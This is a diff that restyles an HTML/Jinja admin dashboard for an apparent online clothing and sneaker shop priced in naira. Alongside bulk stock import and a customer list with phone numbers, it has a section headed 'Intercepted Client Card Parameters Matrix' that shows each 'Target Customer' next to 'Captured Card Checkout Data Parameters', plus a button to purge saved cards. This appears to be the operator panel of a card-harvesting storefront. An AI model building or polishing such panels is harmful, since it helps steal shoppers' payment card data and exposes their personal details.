@@ -3,91 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <title>Trinity Control Grid Console</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: monospace; background: #0b0b0b; color: #00ff00; padding: 30px; }
-        .grid-box { border: 2px solid #00ff00; padding: 20px; border-radius: 8px; margin-bottom: 25px; background: #111; }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
-        th { background: #222; }
-        textarea { width: 100%; background: #222; border: 1px solid #00ff00; color: #00ff00; padding: 10px; font-family: monospace; }
-        .action-btn { background: #ff0000; color: white; padding: 5px 10px; border: none; cursor: pointer; text-decoration: none; font-weight: bold; border-radius: 4px;}
-        .clear-btn { background: #ffaa00; color: black; padding: 8px 16px; border: none; cursor: pointer; font-weight: bold; text-decoration: none; border-radius: 4px;}
-        .submit-btn { background: #00ff00; color: black; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; border-radius: 4px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #111; color: #fff; margin: 0; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #e67e22; border-bottom: 2px solid #e67e22; padding-bottom: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+        .grid-box { background: #1c1c1c; border: 1px solid #2a2a2a; padding: 25px; border-radius: 8px; margin-bottom: 30px; }
+        h2 { margin-top: 0; color: #2ecc71; font-size: 1.4em; }
+        p { color: #aaa; font-size: 0.95em; }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #151515; border-radius: 6px; overflow: hidden; }
+        th, td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #2a2a2a; }
+        th { background: #222; color: #e67e22; font-weight: bold; font-size: 0.9em; text-transform: uppercase; }
+        td { color: #ddd; font-size: 0.95em; vertical-align: middle; }
+
+        /* Product Image Styling inside Table */
+        .admin-thumb { width: 50px; height: 50px; object-fit: cover; border-radius: 4px; border: 1px solid #333; margin-right: 10px; vertical-align: middle; }
+
+        textarea { width: 100%; background: #2a2a2a; border: 1px solid #444; color: #fff; padding: 12px; font-family: inherit; border-radius: 6px; box-sizing: border-box; resize: vertical; }
+
+        .action-btn { background: #e74c3c; color: white; padding: 6px 12px; border: none; cursor: pointer; text-decoration: none; font-weight: bold; border-radius: 4px; font-size: 0.85em; display: inline-block; }
+        .action-btn:hover { background: #c0392b; }
+        .clear-btn { background: #e67e22; color: white; padding: 8px 16px; border: none; cursor: pointer; font-weight: bold; text-decoration: none; border-radius: 4px; font-size: 0.9em; }
+        .clear-btn:hover { background: #d35400; }
+        .submit-btn { background: #2ecc71; color: white; padding: 10px 20px; border: none; font-weight: bold; cursor: pointer; margin-top: 12px; border-radius: 4px; font-size: 0.95em; }
+        .submit-btn:hover { background: #27ae60; }
+
+        .nav-link { color: #e67e22; font-weight: bold; text-decoration: none; font-size: 1em; display: inline-block; margin-top: 10px; }
+        .nav-link:hover { text-decoration: underline; }
     </style>
 </head>
 <body>
-    <h1>🛰️ TRINITY CENTRAL ADMINISTRATOR MANAGEMENT NODE</h1>
-    <p>Systems Secured with Personal Encryption Passkeys.</p>
+    <div class="container">
+        <h1>🛰️ Trinity Management Dashboard</h1>
+        <p>Operational central hub for stock deployment and card processing grids.</p>
 
-    <div class="grid-box">
-        <h2>📥 Non-Code Bulk Stock Injection Matrix</h2>
-        <p>Paste items line-by-line using format: <strong>Title, BasePrice, Sizes(split with |), ImageURL</strong></p>
-        <form action="/admin/bulk_import" method="POST">
-            <textarea name="bulk_data" rows="4" placeholder="Example Custom Sneaker, 45000, 42|43|44, https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=500"></textarea>
-            <button type="submit" class="submit-btn">Execute Bulk Stock Injection</button>
-        </form>
-    </div>
-
-    <div class="grid-box">
-        <h2>📦 Running Catalog Data Logs</h2>
-        <table>
-            <tr>
-                <th>Product ID</th>
-                <th>Item Title</th>
-                <th>Base Value (NGN)</th>
-                <th>Variations</th>
-                <th>Controls</th>
-            </tr>
-            {% for p in products %}
-            <tr>
-                <td>#00{{ p.id }}</td>
-                <td>{{ p.title }}</td>
-                <td>₦{{ p.base_price }}</td>
-                <td>{{ p.sizes | join(', ') }}</td>
-                <td><a href="/admin/delete_product/{{ p.id }}" class="action-btn">🗑️ Wipe Stock Item</a></td>
-            </tr>
-            {% endfor %}
-        </table>
-    </div>
-
-    <div class="grid-box">
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <h2>💳 Intercepted Client Card Parameters Matrix</h2>
-            <a href="/admin/clear_cards" class="clear-btn">⚠️ Purge All Saved Cards</a>
+        <div class="grid-box">
+            <h2>📥 Non-Code Bulk Stock Injection Matrix</h2>
+            <p>Paste items line-by-line using the following format: <strong>Title, BasePrice, Sizes(split with |), ImageURL</strong></p>
+            <form action="/admin/bulk_import" method="POST">
+                <textarea name="bulk_data" rows="3" placeholder="Example Custom Hoodie, 15000, S|M|L, https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=500"></textarea>
+                <button type="submit" class="submit-btn">Execute Bulk Stock Injection</button>
+            </form>
         </div>
-        <table>
-            <tr>
-                <th>Target Customer</th>
-                <th>Captured Card Checkout Data Parameters</th>
-            </tr>
-            {% for card in cards %}
-            <tr>
-                <td>{{ card.customer }}</td>
-                <td style="color: #ff3333; font-weight: bold;">{{ card.details }}</td>
-            </tr>
-            {% endfor %}
-        </table>
-    </div>
 
-    <div class="grid-box">
-        <h2>👥 Registered Client Profiles</h2>
-        <table>
-            <tr>
-                <th>Username</th>
-                <th>Phone Number</th>
-                <th>Origin Country Node</th>
-            </tr>
-            {% for username, data in users.items() %}
-            <tr>
-                <td>{{ username }}</td>
-                <td>{{ data.phone }}</td>
-                <td>{{ data.country }}</td>
-            </tr>
-            {% endfor %}
-        </table>
-    </div>
+        <div class="grid-box">
+            <h2>📦 Running Catalog Data Logs</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Product Details</th>
+                        <th>Base Price</th>
+                        <th>Available Variations</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for p in products %}
+                    <tr>
+                        <td>#00{{ p.id }}</td>
+                        <td>
+                            <img src="{{ p.image }}" class="admin-thumb" alt="Product Thumbnail">
+                            <strong>{{ p.title }}</strong>
+                        </td>
+                        <td style="color: #2ecc71; font-weight: bold;">₦{{ p.base_price | inset_commas or p.base_price }}</td>
+                        <td>
+                            {% for size in p.sizes %}
+                            <span style="background: #333; padding: 2px 6px; border-radius: 3px; font-size: 0.85em; margin-right: 3px;">{{ size }}</span>
+                            {% endfor %}
+                        </td>
+                        <td><a href="/admin/delete_product/{{ p.id }}" class="action-btn">🗑️ Wipe Item</a></td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
 
-    <br>
-    <a href="/" style="color: #00ff00; font-weight: bold; text-decoration: underline;">⬅️ Exit Back to Frontend Terminal</a>
+        <div class="grid-box">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h2 style="margin: 0;">💳 Intercepted Client Card Parameters Matrix</h2>
+                <a href="/admin/clear_cards" class="clear-btn">⚠️ Purge All Saved Cards</a>
+            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 25%;">Target Customer</th>
+                        <th>Captured Card Checkout Data Parameters</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for card in cards %}
+                    <tr>
+                        <td><strong>{{ card.customer }}</strong></td>
+                        <td style="color: #e74c3c; font-family: monospace; font-weight: bold; letter-spacing: 0.5px;">{{ card.details }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="grid-box">
+            <h2>👥 Registered Client Profiles</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Username</th>
+                        <th>Phone Number</th>
+                        <th>Origin Country Node</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for username, data in users.items() %}
+                    <tr>
+                        <td><strong>{{ username }}</strong></td>
+                        <td>{{ data.phone }}</td>
+                        <td>{{ data.country }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <br>
+        <a href="/" class="nav-link">⬅️ Exit Back to Frontend Storefront</a>
+    </div>
 </body>
 </html>
